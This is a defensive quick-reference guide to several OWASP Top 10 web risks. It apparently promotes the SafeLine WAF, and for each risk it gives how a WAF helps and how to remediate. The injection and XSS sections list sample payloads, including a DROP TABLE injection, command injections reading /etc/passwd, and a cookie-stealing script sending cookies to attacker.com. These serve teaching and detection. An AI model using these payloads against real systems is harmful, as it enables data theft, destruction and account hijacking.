# OWASP Top 10 Quick Reference Guide

## A01:2021 — Broken Access Control

Access control enforces policy so users cannot act outside their intended permissions. Failures typically lead to unauthorized information disclosure, modification, or destruction of data.

### Common Attacks
- Modifying the URL or API request to access other users' data
- Viewing or editing someone else's account by providing its unique identifier
- Elevation of privilege (acting as admin when logged in as user)
- CORS misconfiguration

### How WAF Helps
- Block suspicious URL patterns that attempt to access admin/restricted endpoints
- Detect parameter tampering (e.g., changing user_id in requests)

### Remediation
- Deny by default (except for public resources)
- Implement access control mechanisms once and reuse throughout the application
- Log access control failures and alert administrators

## A02:2021 — Cryptographic Failures

Previously known as "Sensitive Data Exposure." Focuses on failures related to cryptography which often lead to exposure of sensitive data.

### How WAF Helps
- Detect data leakage in responses (credit card numbers, SSNs)
- Enforce HTTPS redirection

## A03:2021 — Injection

SQL injection, NoSQL injection, OS command injection, and LDAP injection occur when untrusted data is sent to an interpreter as part of a command or query.

### Common Attacks

#### SQL Injection (CWE-89)
- `' OR 1=1 --` — Boolean-based blind SQLi
- `' UNION SELECT username,password FROM users --` — Data exfiltration
- `'; DROP TABLE users; --` — Destructive SQLi
- Time-based blind: `' OR IF(1=1, SLEEP(5), 0) --`

#### Command Injection (CWE-78)
- `; cat /etc/passwd` — via semicolon
- `| whoami` — via pipe
- `` `id` `` — via backtick
- `$(cat /etc/passwd)` — via command substitution

### How WAF Helps
- SafeLine's semantic analysis detects SQL injection patterns even when obfuscated
- Blocks command injection payloads in request parameters
- Detects UNION-based, boolean-based, and time-based blind SQLi

### Remediation
- Use parameterized queries (prepared statements)
- Use stored procedures
- Validate and sanitize all user input
- Escape special characters

## A07:2021 — Cross-Site Scripting (XSS)

XSS flaws occur when an application includes untrusted data in a web page without proper validation or escaping.

### Types
1. **Reflected XSS**: Malicious script is reflected off a web server in error messages, search results, etc.
2. **Stored XSS**: Malicious script is permanently stored on the target server (database, forum, comment field)
3. **DOM-based XSS**: JavaScript on the page processes data from an untrusted source

### Common Payloads
- `<script>alert('XSS')</script>` — Basic script injection
- `<img src=x onerror=alert('XSS')>` — Event handler injection
- `<svg onload=alert('XSS')>` — SVG-based injection
- `javascript:alert('XSS')` — Protocol-based injection
- Cookie theft: `<script>document.location='http://attacker.com/steal?c='+document.cookie</script>`

### How WAF Helps
- SafeLine detects script tags, event handlers, and protocol injections
- Blocks both reflected and stored XSS attempts at the request level
- Semantic analysis catches obfuscated XSS payloads

### Remediation
- Escape all user-supplied data before rendering in HTML
- Use Content Security Policy (CSP) headers
- Use frameworks that automatically escape XSS by design (React, Angular)
- Validate input on the server side

## A05:2021 — Security Misconfiguration

Missing security hardening, default accounts with unchanged passwords, unnecessary features enabled.

### How WAF Helps
- Block access to default admin pages
- Detect and block directory listing attempts
- Hide server version headers

## A08:2021 — Software and Data Integrity Failures

Code and infrastructure that does not protect against integrity violations. Example: deserialization attacks.

## A10:2021 — Server-Side Request Forgery (SSRF)

SSRF occurs when a web application fetches a remote resource without validating the user-supplied URL.

### How WAF Helps
- SafeLine can detect and block SSRF patterns
- Blocks requests containing internal IP addresses (127.0.0.1, 169.254.x.x, 10.x.x.x)
